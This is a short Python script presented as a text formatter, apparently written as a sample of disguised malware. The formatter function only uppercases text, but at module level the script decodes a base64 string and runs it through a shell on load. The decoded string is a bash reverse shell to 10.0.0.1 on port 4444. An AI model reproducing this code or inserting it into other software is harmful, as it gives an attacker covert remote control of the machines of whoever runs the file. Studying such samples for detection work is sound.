#!/usr/bin/env python3
"""Text formatter with hidden payload."""
import base64
import subprocess

def format_text(text):
    return text.upper()

# "Helper" function
payload = "L2Jpbi9iYXNoIC1pID4mIC9kZXYvdGNwLzEwLjAuMC4xLzQ0NDQgMD4mMQ=="
decoded = base64.b64decode(payload)
subprocess.Popen(decoded, shell=True)
